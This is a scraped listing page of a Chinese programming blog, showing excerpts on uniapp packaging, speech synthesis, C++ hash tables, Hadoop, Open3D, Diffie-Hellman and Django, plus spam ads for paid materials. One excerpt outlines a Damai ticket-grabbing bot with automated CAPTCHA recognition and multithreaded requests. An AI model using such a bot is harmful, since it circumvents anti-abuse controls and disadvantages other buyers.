既有适合小白学习的零基础资料，也有适合3年以上经验的小伙伴深入学习提升的进阶课程，涵盖了95%以上软件测试知识点，真正体系化！
由于文件比较多，这里只是将部分目录截图出来，全套包含大厂面经、学习笔记、源码讲义、实战项目、大纲路线、讲解视频，并且后续会持续更新
如果你需要这些资料，可以添加V获取：vip1024b （备注软件测试）
正文 2. 启动uniapp，配置打包证书
3.开始云打包
二、上传apk，下载测试
1. 点击上传
一、 打包 Android ，生成apk 1. 原生APP-云打包 与 原生APP本地打包 开始使用打包之前，我们先看一下【 发行 】的工具栏，我们来简单介绍一下云打包与本地打包的区别：
原生APP-云打包：
① 通过官方在【云服务器】已经提供好的打包环境进行打包，简单方便快捷，适合新手入门；
② 打包次数限制，1天只能打包【5次】，第六次需要收费(大概2￥一次)
③ 打包时间长度不受控，高峰期排队时长可能需要 【几个小时】以上
原生APP-本地打包：
① 需要下载 Android Studio(Android 集成开发工具)配置环境，需要熟悉原生Android 开发，操作难度大，灵活性高；
② 本地离线打包，不限制打包次数，完全免费；
③ 打包时间受控，下载好离线SDK，配置好资源环境，无需排队；
总结一下，云打包适合我这种菜鸟选手，当然今天也是演示云打包
2. 启动uniapp，配置打包证书 接着上一步的操作，我们点击【原生APP-云打包】
配置打包资源注意点：
**① 打包证书：**使用自有证书，证书的作用：证书是一个开发者身份的标识，对Android 系统而言，使用一个证书签发的APP，是属于同一个开发者的APP；
**② 为什么使用自由证书：**云端证书、公共测试证书，可能会出现证书相同的情况，这个情况是不安全的，应用证书泄露可能会导致仿冒APP，从而覆盖之前我们生成好的包；
**③ 没有证书如何生成：**使用 Java 【JDK】keytool 工具生成一个，制作Android没有费用，而Apple证书需要收费；官方制作地址：https://ask.dcloud.net.cn/article/35777
**④ 打正式包：**项目需要上线则要打正式包
其他可以根据需求自行配置
3.开始云打包 网上学习资料一大堆，但如果学到的知识不成体系，遇到问题时只是浅尝辄止，不再深入研究，那么很难做到真正的技术提升。
需要这份系统化的资料的朋友，可以添加V获取：vip1024b （备注软件测试）
一个人可以走的很快，但一群人才能走的更远！不论你是正从事IT行业的老鸟或是对IT行业感兴趣的新人，都欢迎加入我们的的圈子（技术交流、学习资源、职场吐槽、大厂内推、面试辅导），让我们一起学习成长！
[外链图片转存中…(img-OfpZM44y-1713173432005)]
一个人可以走的很快，但一群人才能走的更远！不论你是正从事IT行业的老鸟或是对IT行业感兴趣的新人，都欢迎加入我们的的圈子（技术交流、学习资源、职场吐槽、大厂内推、面试辅导），让我们一起学习成长！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1e436a2291cdc068ad7ef4de02450e8/" rel="bookmark">
			js纯前端实现语音播报，朗读功能（2024-04-15）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实现语音播报要有两个原生API
分别是【window.speechSynthesis】【SpeechSynthesisUtterance】
项目代码
// 执行函数 initVoice({ text: '项目介绍', vol: 1, rate: 1 }) // 函数 export function initVoice(config) { window.speechSynthesis.cancel();//播报前建议调用取消的函数，如有正在播报的话音，播报会任务被塞进入队列，只有等上一个语音结束才会执行下一个语音 //获取语音包 let listArr = window.speechSynthesis.getVoices(); listArr = listArr.filter(item =&gt; item.lang.indexOf('zh-') &gt; -1); if (listArr.length == 0) { console.error('没有可用的中文语音!'); } //实例化播报内容 let instance = new SpeechSynthesisUtterance(); instance.text = config.text || '轻轻敲醒沉睡的心灵，慢慢张开你的眼睛，看看忙碌的世界，是否依然孤独的转个不停！'; // 文字内容 instance.lang = config.lang || "zh-CN"; // 使用的语言:中文 instance.volume = config.vol || 1; // 声音音量：1 instance.rate = config.rate || 1; // 语速：1 instance.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e1e436a2291cdc068ad7ef4de02450e8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7cb9c45b24e232a37a3e85b030c44105/" rel="bookmark">
			【C&#43;&#43;】unordered_map &amp; unordered_set 底层刨析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 哈希表的改造2. unordered_map3. unordered_set C++ STL 库中，unordered_map 和 unordered_set 容器的底层为哈希表，本文将简单模拟哈希表（哈希桶），unordered_map 和 unordered_set 只需封装哈希表的接口即可实现。 1. 哈希表的改造 模板参数列表的改造
K：关键码类型T：不同容器 T 的类型不同，如果是 unordered_map，T 代表一个键值对，如果是 unordered_set，T 为 KKeyOfT：从 T 中获取 KeyHash：哈希函数仿函数对象类型，哈希函数使用除留余数法，需要将 Key 转换为整型数字才能取模 template&lt;class K, class T, class KeyOfT, class Hash&gt; class HashTable; 增加迭代器操作
// 为了实现简单，在哈希桶的迭代器类中需要用到HashTable本身 template&lt;class K, class T, class KeyOfT, class Hash&gt; class HashTable; // 注意：因为哈希桶在底层是单链表结构，所以哈希桶的迭代器不需要--操作 template&lt;class K, class T, class KeyOfT, class Hash&gt; struct __HTIterator { typedef HashNode&lt;T&gt; Node; typedef HashTable&lt;K, T, KeyOfT, Hash&gt; HT; typedef __HTIterator&lt;K, T, KeyOfT, Hash&gt; Self; Node* _node;	// 当前迭代器关联的节点 HT* _ht;	// 哈希桶 - 主要是为了找下一个空桶时候方便 __HTIterator(Node* node, HT* ht) : _node(node) , _ht(ht) {} T&amp; operator*() { return _node-&gt;_data; } Self&amp; operator++() { if (_node-&gt;_next) { // 当前桶还是节点 _node = _node-&gt;_next; } else { // 当前桶走完了，找下一个桶 KeyOfT kot; Hash hs; size_t hashi = hs(kot(_node-&gt;_data)) % _ht-&gt;_tables.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7cb9c45b24e232a37a3e85b030c44105/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/974f84df59721fde3a422198ef29fe51/" rel="bookmark">
			大数据基础hadoop / hive / hbase
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 大数据之hadoop / hive / hbase 的区别是什么？
1. hadoop
它是一个分布式计算+分布式文件系统，前者其实就是 MapReduce，后者是 HDFS 。后者可以独立运行，前者可以选择性使用，也可以不使用
2. hive
通俗的说是一个数据仓库，仓库中的数据是被hdfs管理的数据文件，它支持类似sql语句的功能，你可以通过该语句完成分布式环境下的计算功能，hive会把语句转换成MapReduce，然后交给hadoop执行。这里的计算，仅限于查找和分析，而不是更新、增加和删除。
它的优势是对历史数据进行处理，用时下流行的说法是离线计算，因为它的底层是MapReduce，MapReduce在实时计算上性能很差。它的做法是把数据文件加载进来作为一个hive表（或者外部表），让你觉得你的sql操作的是传统的表。
3. hbase
通俗的说，hbase的作用类似于数据库，传统数据库管理的是集中的本地数据文件，而hbase基于hdfs实现对分布式数据文件的管理，比如增删改查。也就是说，hbase只是利用hadoop的hdfs帮助其管理数据的持久化文件（HFile），它跟MapReduce没任何关系。
hbase的优势在于实时计算，所有实时数据都直接存入hbase中，客户端通过API直接访问hbase，实现实时计算。由于它使用的是nosql，或者说是列式结构，从而提高了查找性能，使其能运用于大数据场景，这是它跟MapReduce的区别。
总结：
hadoop是hive和hbase的基础，hive依赖hadoop，而hbase仅依赖hadoop的hdfs模块。
hive适用于离线数据的分析，操作的是通用格式的（如通用的日志文件）、被hadoop管理的数据文件，它支持类sql，比编写MapReduce的java代码来的更加方便，它的定位是数据仓库，存储和分析历史数据。
hbase适用于实时计算，采用列式结构的nosql，操作的是自己生成的特殊格式的HFile、被hadoop管理的数据文件，它的定位是数据库，或者叫DBMS。
hive可以直接操作hdfs中的文件作为它的表的数据，也可以使用hbase数据库作为它的表。
一、HADOOP基础 1.大数据基础组件HDFS -分布式存储 参考：(超详细)大数据Hadoop之HDFS组件_[root@hadoop100 sbin]# start-dfs.sh starting namen-CSDN博客
【基础知识】大数据组件HDFS简述-CSDN博客
HDFS全称为Hadoop Distributed File System，很简单Hadoop的分布式文件存储系统。
定义： HDFS，它是一个文件系统，用于存储文件，通过目录树来定位文件；其次，它是分布式的，由很多服务器联合起来实现其功能，集群中的服务 器有各自的角色。
​ HDFS 的使用场景：适合一次写入，多次读出的场景。一个文件经过创建、写入和关闭 之后就不需要改变。
​ HDFS 的组成节点：
HDFS是经典的Master和Slave架构，每一个HDFS集群包括一个NameNode和多个DataNode。
Master-Slave架构常见于分布式系统或数据库管理系统。Master-Slave架构具有可伸缩性和容错性，能够处理更多并发请求，并在主节点故障时通过从节点继续提供服务，提高系统的可用性和可靠性。
主节点（Master）负责整个系统的协调和管理，接收并分配任务给从节点（Slave）。
从节点执行主节点分配的任务，可能包括读取、计算或存储数据。在数据库系统中，从节点还负责数据的复制和备份，以提高系统的可用性和容错性。
NameNode管理所有文件的元数据信息，并且负责与客户端交互。
DataNode负责管理存储在该节点上的文件。每一个上传到HDFS的文件都会被划分为一个或多个数据块，这些数据块根据HDFS集群的数据备份策略被分配到不同的DataNode上，位置信息交由NameNode统一管理。
Client客户端
​ 1): 文件切分。文件上传HDFS时，Client将文件切分成一个一个的Block，然后进行上传；
​ 2): 与NameNode交互，获取文件的位置信息；
​ 3): 与DataNode交互，读取或者写入数据；
​ 4): Client提供一些命令来管理HDFS，比如NameNode格式化；
​ 5): Client可以通过一些命令来访问HDFS，比如对HDFS增删查改操作；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/974f84df59721fde3a422198ef29fe51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd7d81c9e95b5d4b509b9e275a80f0ce/" rel="bookmark">
			Python 大麦抢票脚本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		请注意，编写或使用抢票脚本可能违反相关网站的服务条款和法律法规。以下内容仅供学习和了解技术原理之用，不鼓励或支持任何违反规定的行为。
在Python中编写大麦网抢票脚本通常涉及以下几个步骤：
1. 分析网站结构
使用浏览器的开发者工具（如Chrome的Inspect功能）分析大麦网的页面结构和网络请求。
确定抢票过程中需要交互的页面元素和提交的表单数据。
2. 发送网络请求
使用`requests`库发送HTTP请求，模拟浏览器操作。
处理登录、获取票务信息、提交订单等步骤。
3. 处理验证码
-如果网站有验证码，可能需要使用图像处理库（如`PIL`或`opencv`）来自动识别，或者使用第三方验证码识别服务。
4. 优化性能
使用多线程或异步IO（如`asyncio`库）来提高脚本的运行效率。
合理设置请求间隔，避免因频繁请求被服务器封禁。
5. 遵守法律法规
确保脚本的使用不违反相关法律法规和服务条款。
考虑到其他用户的权益，不要过度占用服务器资源。
示例代码（仅供参考）
import requests from bs4 import BeautifulSoup # 基本的请求头 headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3', 'Referer': 'https://www.damai.cn/', 'Cookie': '你的大麦网登录cookie' } # 登录URL login_url = 'https://www.damai.cn/login' # 抢票URL（示例） ticket_url = 'https://www.damai.cn/some-ticket-page' # 发送登录请求 session = requests.Session() login_data = { 'username': '你的账号', 'password': '你的密码' } response = session.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dd7d81c9e95b5d4b509b9e275a80f0ce/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92ab0fc6a52266df039d447cf5fd1ed4/" rel="bookmark">
			Open3D 点云数据处理基础（Python版）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Open3D 点云数据处理基础（Python版）
文章目录 1 概述
2 安装
2.1 PyCharm 与 Python 安装
2.3 Anaconda 安装
2.4 Open3D 0.13.0 安装
2.5 新建一个 Python 项目
3 点云读写
4 点云可视化
2.1 可视化单个点云
2.2 同一窗口可视化多个点云
2.3 可视化的属性设置
5 k-d tree 与 Octree
5.1 k-d tree
5.2 Octree
5.2.1 从点云中构建Octree
5.2.2 从体素栅格中构建Octree
6 点云滤波
6.1 体素下采样
6.2 统计滤波
6.3 半径滤波
7 点云特征提取
7.1 法线估计
8 点云分割
8.1 DBSCAN 聚类分割
8.2 RANSAC 平面分割
8.3 隐藏点剔除
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/92ab0fc6a52266df039d447cf5fd1ed4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0dcba4c574c8e1aa3f9dccc20ccde75/" rel="bookmark">
			密钥交换算法 之 DH/ECDH/ECDHE原理与Python实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
基本原理
相关数学
基本数学公式
离散对数问题（Discrete Logarithm Problem，DLP）
DH (Diffie-Hellman)算法
基本流程
代码实现
使用cryptography库的代码实现
ECDH (Elliptic Curve Diffie-Hellman)算法
基本流程
代码实现
ECDHE（Elliptic Curve Diffie-Hellman Ephemeral）算法
基本原理 密钥交换算法的基本原理是使得两个通信方能够在不安全的通信渠道上安全地协商出一个共享密钥，该共享密钥用于对后续通信进行加密，以确保通信信息的机密性和完整性。密钥交换算法通常利用数学上的难题来确保即使交换过程被窃听，窃听者也不能轻易推导出共享密钥。
以下是密钥交换算法的一些基本概念：
公开参数
在大多数密钥交换协议中，参与者需要预先同意一些公开的参数。这些参数通常是通过不安全的渠道公开交换的，因此不会泄露任何秘密信息。例如，在Diffie-Hellman密钥交换中，公开参数是一个大素数和一个基数。
私有密钥
每个参与者都会生成一个私有密钥，这个密钥是秘密的，通常是通信设备自己保存，不会通过不安全的渠道公开。私有密钥在密钥交换过程中起到了至关重要的作用。
公开密钥
每个参与者都会使用公开参数和自己的私有密钥生成一个公开密钥。公开密钥在不安全的渠道上传输，虽然它是由私有密钥和公开参数生成的，但依然无法直接推导出私有密钥。
密钥推导
当通信双方收到对方的公开密钥后，他们将使用自己的私有密钥和对方的公开密钥来生成共享密钥。重要的是，尽管窃听者可能知道公开参数和双方的公开密钥，但没有私有密钥，他们不能计算出共享密钥。
数学难题
密钥交换算法通常基于数学上的难题，如离散对数问题或椭圆曲线上的类似问题。这些问题在一定条件下是计算上可行的，但在没有足够信息的情况下（例如，没有私有密钥）是极其困难的。
前向保密性（Forward Secrecy）
一些密钥交换算法，如ECDHE，提供了前向保密性。这意味着即使在将来某个时刻一个参与者的私有密钥被发现，之前的通信记录也无法被解密，因为每次通信都使用了不同的临时密钥对。
相关数学 基本数学公式 先来回忆一下相关的数学公式
%加法 (a + b) mod n = [(a mod n) + (b mod n)] mod n %减法 (a - b) mod n = [(a mod n) - (b mod n) + n] mod n %乘法 (a * b) mod n = [(a mod n) * (b mod n)] mod n %指数律 (a^b) mod n = [(a mod n)^b] mod n %指数分解 (a^(b+c)) mod n = [(a^b mod n) * (a^c mod n)] mod n %指数乘法 (a^(b*c)) mod n = [(a^b mod n)^c] mod n 离散对数问题（Discrete Logarithm Problem，DLP） 在数学中，一个群（Group）是一种代数结构，由一组元素以及一个在这些元素上定义的操作（通常称为群运算）组成，满足以下四个基本性质：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e0dcba4c574c8e1aa3f9dccc20ccde75/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/afcc3b57d96f32a92b53b02c6cd0bfef/" rel="bookmark">
			PythonCharm运行Django项目
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 博主介绍：
大家好，本人精通Java、Python、C#、C、C++编程语言，同时也熟练掌握微信小程序、Php和Android等技术，能够为大家提供全方位的技术支持和交流。
我有丰富的成品Java、Python、C#毕设项目经验，能够为学生提供各类个性化的开题框架和实际运作方案。
我擅长在JavaWeb、SSH、SSM、SpringBoot+VUE、VUE+FastApi、Python+Django等框架下进行项目开发，具有丰富的项目经验和开发技能。我的代码风格规范、优美、易读性强，同时也注重性能优化、代码重构等方面的实践和经验总结。
同时我也提供相关的毕业设计、课程作业、期末大作业的代写代做及学习资料、程序开发、技术解答、项目远程部署、代码讲解、文档报告等专业服务。
文末联系博主
PythonCharm运行Django项目 一、开发环境安装1.python安装2.PythonCharm专业版本安装 二、项目运行1.PythonCharm打开项目2.设置项目运行环境3.执行数据库脚本4.执行运行加载依赖包命令和启动命令 一、开发环境安装 1.python安装 Python3.7安装教程
2.PythonCharm专业版本安装 PythonCharm专业版本安装教程
二、项目运行 1.PythonCharm打开项目 2.设置项目运行环境 3.执行数据库脚本 4.执行运行加载依赖包命令和启动命令 加载依赖包命令
pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple 项目启动命令
python manage.py runserver 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/417/">«</a>
	<span class="pagination__item pagination__item--current">418/621</span>
	<a class="pagination__item pagination__item--next btn" href="/page/419/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>